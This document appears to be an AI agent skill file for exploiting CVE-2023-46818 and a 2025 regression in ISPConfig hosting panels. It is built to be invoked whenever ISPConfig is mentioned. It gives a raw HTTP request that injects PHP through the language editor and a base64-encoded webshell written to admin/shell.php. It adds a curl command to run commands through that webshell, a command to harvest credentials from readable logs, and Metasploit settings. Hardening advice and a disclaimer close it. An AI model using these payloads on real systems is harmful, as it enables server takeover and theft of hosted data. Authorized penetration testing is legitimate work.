---
name: ispconfig-pentest
description: How to exploit CVE-2023-46818 and related vulnerabilities in ISPConfig hosting control panels. Use this skill whenever the user mentions ISPConfig, hosting control panel pentesting, CVE-2023-46818, language editor exploitation, or needs to test for PHP code injection in ISPConfig 3.2.x or 3.3.x. This skill provides automated exploit scripts, manual exploitation steps, and hardening guidance for ISPConfig security assessments.
---

# ISPConfig Pentesting Skill

A skill for testing ISPConfig hosting control panels for CVE-2023-46818 (language editor PHP code injection) and related vulnerabilities.

## When to Use This Skill

Use this skill when:
- You need to test an ISPConfig installation for known vulnerabilities
- You're assessing CVE-2023-46818 or the 2025 regression in 3.3.0/3.3.0p1
- You need to exploit the language editor PHP code injection vulnerability
- You want to check if `admin_allow_langedit` is enabled
- You need hardening recommendations for ISPConfig

## Quick Start

### Automated Exploitation

Use the bundled Python exploit script:

```bash
python3 scripts/ispconfig_exploit.py http://target:8080 admin <password>
```

This script:
- Extracts CSRF tokens automatically
- Tests for code execution
- Can deploy a webshell
- Supports both CVE-2023-46818 and the 2025 regression

### Version Check

Before exploiting, verify the target version and conditions:

```bash
python3 scripts/check_ispconfig.py http://target:8080
```

## Vulnerability Overview

### CVE-2023-46818 (ISPConfig ≤ 3.2.11)

**Affected Versions:** ISPConfig up to 3.2.11 (fixed in 3.2.11p1)

**Preconditions:**
- Login as the built-in superadmin account `admin`
- Language editor must be enabled: `admin_allow_langedit=yes` in `/usr/local/ispconfig/security/security_settings.ini`

**Impact:** Authenticated admin can inject arbitrary PHP into language files, achieving RCE in the web server context.

### 2025 Regression (ISPConfig 3.3.0 / 3.3.0p1)

The same vulnerability resurfaced in 3.3.0/3.3.0p1 and was fixed in **3.3.0p2**.

**Additional Information Leak:** On 3.3.0/3.3.0p1, world-readable rotated logs may leak credentials:

```bash
find /usr/local/ispconfig/interface/log -type f -perm -004 -name '*.gz' -exec zcat {} + | head
```

## Manual Exploitation Flow

### Step 1: Access the Admin Panel

If the panel is bound to localhost only, use SSH port forwarding:

```bash
ssh -L 9001:127.0.0.1:8080 user@target
# Then browse http://127.0.0.1:9001
```

### Step 2: Obtain CSRF Tokens

Send a POST to `/admin/language_edit.php` to initialize the form and extract `csrf_id` and `csrf_key` from the HTML response.

### Step 3: Inject PHP Code

Submit a second POST with the CSRF fields and a malicious translation record:

```http
POST /admin/language_edit.php HTTP/1.1
Host: 127.0.0.1:9001
Content-Type: application/x-www-form-urlencoded
Cookie: ispconfig_auth=<session>

lang=en&module=admin&file=messages&csrf_id=<id>&csrf_key=<key>&records[]=<?php echo shell_exec('id'); ?>
```

### Step 4: Test Code Execution

**Command execution probe:**
```http
records[]=<?php echo shell_exec('id'); ?>
```

**Out-of-band test (ICMP):**
```http
records[]=<?php echo shell_exec('ping -c 1 10.10.14.6'); ?>
```

### Step 5: Deploy Webshell

Write a webshell using base64 encoding to avoid POST body issues:

```http
records[]=<?php file_put_contents('admin/shell.php', base64_decode('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pIDsgPz4K')); ?>
```

Access the webshell:
```bash
curl 'http://127.0.0.1:9001/admin/shell.php?cmd=id'
```

**Note:** If PHP is executed as root (e.g., via `php -S 127.0.0.1:8080` started by root), this yields immediate root RCE.

## Bundled Scripts

### `scripts/ispconfig_exploit.py`

Full-featured exploit script with:
- Automatic CSRF token extraction
- Multiple payload options
- Webshell deployment
- Interactive command execution

**Usage:**
```bash
python3 scripts/ispconfig_exploit.py <url> <username> <password> [options]

Options:
  --cmd <command>     Execute a command
  --webshell          Deploy a webshell
  --check             Test for vulnerability without exploitation
  --verbose           Show detailed output
```

### `scripts/check_ispconfig.py`

Version and condition checker:
- Detects ISPConfig version
- Checks if language editor is enabled
- Identifies affected versions

**Usage:**
```bash
python3 scripts/check_ispconfig.py <url>
```

## Metasploit Module

Rapid7 released `exploit/linux/http/ispconfig_lang_edit_php_code_injection` (July 2025):

```text
use exploit/linux/http/ispconfig_lang_edit_php_code_injection
set RHOSTS 10.10.10.50
set RPORT 8080
set USERNAME admin
set PASSWORD <admin_pass>
set TARGETURI /
run
```

The module can auto-enable `admin_allow_langedit` if the admin account has system-config rights.

## Hardening Recommendations

### Immediate Actions

1. **Upgrade ISPConfig:**
   - For CVE-2023-46818: Upgrade to **3.2.11p1** or later
   - For 2025 regression: Upgrade to **3.3.0p2** or later

2. **Disable Language Editor:**
   ```ini
   # /usr/local/ispconfig/security/security_settings.ini
   admin_allow_langedit=no
   ```

3. **Run as Non-Root:**
   - Configure PHP-FPM or web server to drop privileges
   - Never run `php -S` as root

4. **Strong Authentication:**
   - Enforce strong password for the built-in `admin` account
   - Consider additional authentication mechanisms

### Additional Hardening

- Remove or restrict access to rotated logs in `/usr/local/ispconfig/interface/log/`
- Implement network segmentation for the admin panel
- Enable audit logging for admin actions
- Regular security updates and patching

## References

- [CVE-2023-46818 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)
- [ISPConfig 3.2.11p1 Released](https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/)
- [ISPConfig 3.3.0p2 Security Update](https://www.ispconfig.org/blog/ispconfig-3-3-0p2-released-security-update/)
- [bipbopbup/CVE-2023-46818-python-exploit](https://github.com/bipbopbup/CVE-2023-46818-python-exploit)
- [Metasploit Module (CXSecurity)](https://cxsecurity.com/issue/WLB-2025070017)

## Legal Disclaimer

This skill is for authorized security testing only. Ensure you have explicit permission before testing any system. Unauthorized access to computer systems is illegal.
